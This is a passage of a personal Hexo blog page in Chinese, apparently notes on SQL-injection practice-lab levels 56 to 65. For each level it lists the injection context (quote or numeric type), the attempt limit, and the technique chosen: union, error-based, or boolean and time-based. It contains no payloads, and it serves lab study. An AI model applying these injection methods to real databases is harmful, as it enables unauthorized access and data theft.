+<p>&#x2F;&#x2F;单引号括号，14次限制 union<br>56：无注入限制，走union流程</p>
+<p>&#x2F;&#x2F;双引号注入 14次限制 union<br>57：无注入限制，走union流程</p>
+<p>&#x2F;&#x2F;单引号注入 5次限制，有报错，次数太少无法使用union<br>58：无注入限制，走报错流程 </p>
+<p>&#x2F;&#x2F;数字型注入 5次限制，有报错，次数太少无法使用union<br>59：无注入限制，走报错流程</p>
+<p>&#x2F;&#x2F;双引号括号注入 5次限制，有报错，次数太少无法使用union<br>&#x2F;&#x2F;60：无注入限制，走报错流程</p>
+<p>&#x2F;&#x2F;单引号双括号注入 5次限制，有报错，次数太少无法使用union<br>&#x2F;&#x2F;61：无注入限制，走报错流程</p>
+<p>&#x2F;&#x2F;单引号括号注入 140次限制<br>&#x2F;&#x2F;62：布尔 睡眠</p>
+<p>&#x2F;&#x2F;单引号布尔，睡眠 140次限制<br>63：</p>
+<p>&#x2F;&#x2F;数字型双括号 布尔，睡眠 140次限制</p>
+<p>64：</p>
+<p>&#x2F;&#x2F;数字型括号，布尔，睡眠 140次限制<br>65：</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 k-onlの狗窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;k-onl
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
